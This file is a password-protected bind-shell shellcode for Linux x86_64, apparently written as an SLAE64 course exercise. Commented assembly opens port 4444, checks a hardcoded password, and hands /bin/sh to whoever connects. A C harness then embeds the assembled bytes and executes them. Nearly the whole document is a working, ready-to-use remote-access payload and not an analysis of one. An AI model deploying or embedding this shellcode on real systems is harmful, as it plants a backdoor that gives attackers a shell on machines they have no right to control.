/*
; Title		: Linux/x86_64 - Bind Shell (/bin/sh) with Password (configurable) (129 bytes)
; Date		: 2019-08-18
; Author	: Gonçalo Ribeiro (@goncalor)
; Website	: goncalor.com
; SLAE64-ID	: 1635

global _start

%define pass "pass"
%define port 0x5c11  ; htons(4444)

_start:
    jmp real_start
    password: db pass
    pass_len: db $-password

real_start:
socket:
    ; sock = socket(AF_INET, SOCK_STREAM, 0)
    ; AF_INET = 2
    ; SOCK_STREAM = 1
    ; __NR_socket = 41
    ; On success, a file descriptor for the new socket is returned

    push 41
    pop rax
    push 2
    pop rdi
    push 1
    pop rsi
    cdq       ; copies rax's bit 31 to all bits of edx (zeroes rdx)
    syscall

    push rax
    pop rdi

bind:
    ; server.sin_family = AF_INET;    short
    ; server.sin_port = htons(4444);    unsigned short
    ; server.sin_addr.s_addr = INADDR_ANY;    unsigned long
    ; bzero(&server.sin_zero, 8);
    ;
    ; https://beej.us/guide/bgnet/html/multi/sockaddr_inman.html
    ; struct sockaddr_in {
    ;     short            sin_family;
    ;     unsigned short   sin_port;
    ;     struct in_addr   sin_addr;
    ;     char             sin_zero[8];
    ; };
    ;
    ; bind(sock, (struct sockaddr *)&server, sockaddr_len)
    ; INADDR_ANY = 0
    ; AF_INET = 2
    ; __NR_bind = 49
    ; On  success,  zero is returned

    xor eax, eax  ; shorter and will still zero the upper bytes
    push rax      ; sin_zero
    push ax
    push ax       ; sin_addr
    push word port
    push word 2

    ; bind
    add al, 49
    push rsp
    pop rsi
    add dl, 16    ; sizeof(sockaddr_in)
    syscall

listen:
    ; listen(sock, 2)
    ; __NR_listen = 50
    ; On success, zero is returned

    mov al, 50
    xor esi, esi
    mov sil, 2
    syscall

accept:
    ; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
    ; __NR_accept = 43
    ; On success, a file descriptor is returned

    mov al, 43
    xor esi, esi
    ;xor rdx, rdx  ; already zeroed
    syscall

    push rax

;close:
    ; close(sock)
    ; __NR_close = 3
    ; returns zero on success

    ; closing is not strictly necessary
    ;mov al, 3
    ;syscall

dup2:
    ; dup2(new, 0);
    ; dup2(new, 1);
    ; dup2(new, 2);
    ; __NR_dup2 = 33
    ; On success, return the new file descriptor

    pop rdi        ; "new" was pushed in accept()
    push 2
    pop rsi

dup2_loop:
    mov al, 33
    syscall
    dec esi
    jns dup2_loop

read_password:
    ; read(int fd, void *buf, size_t count)
    ; On success, the number of bytes read is returned

    ;xor eax, eax  ; already done by dup2
    ;rdi = "new"   ; already done in dup2
    push rax
    push rax       ; create space for "buf" in the stack
    push rsp
    pop rsi        ; rsi = *buf
    mov dl, 16
    syscall

compare_password:
    xor ecx, ecx
    lea rdi, [rel pass_len]
    mov cl, [rdi]
    sub rdi, rcx
    cld
    repz cmpsb
    jne exit

execve:
    ; execve(const char *path, char *const argv[], char *const envp[])
    ; rdi, path = (char*) /bin//sh, 0x00 (double slash for padding)
    ; rsi, argv = (char**) (/bin//sh, 0x00)
    ; rdx, envp = &0x00

    xor eax, eax
    push rax
    push rsp
    pop rdx      ; *rdx = &0x00

    mov rsi, 0x68732f2f6e69622f  ; rax2 -S $(echo /bin//sh | rev)
    push rsi
    push rsp
    pop rdi      ; rdi = (char*) /bin//sh

    push rax
    push rdi
    push rsp
    pop rsi      ; rsi = (char**) (/bin//sh, 0x00)

    mov al, 59
    syscall

exit:
    ;xor eax, eax  ; upper bytes are zero after read
    mov al, 60
    syscall
*/


#include <stdio.h>
#include <string.h>

char code[] =
"\xeb\x05\x70\x61\x73\x73\x04\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f"
"\x05\x50\x5f\x31\xc0\x50\x66\x50\x66\x50\x66\x68\x11\x5c\x66\x6a\x02\x04"
"\x31\x54\x5e\x80\xc2\x10\x0f\x05\xb0\x32\x31\xf6\x40\xb6\x02\x0f\x05\xb0"
"\x2b\x31\xf6\x0f\x05\x50\x5f\x6a\x02\x5e\xb0\x21\x0f\x05\xff\xce\x79\xf8"
"\x50\x50\x54\x5e\xb2\x10\x0f\x05\x31\xc9\x48\x8d\x3d\xad\xff\xff\xff\x8a"
"\x0f\x48\x29\xcf\xfc\xf3\xa6\x75\x1a\x31\xc0\x50\x54\x5a\x48\xbe\x2f\x62"
"\x69\x6e\x2f\x2f\x73\x68\x56\x54\x5f\x50\x57\x54\x5e\xb0\x3b\x0f\x05\xb0"
"\x3c\x0f\x05";

int main() {
    printf("length: %lu\n", strlen(code));
    ((int(*)()) code)();
}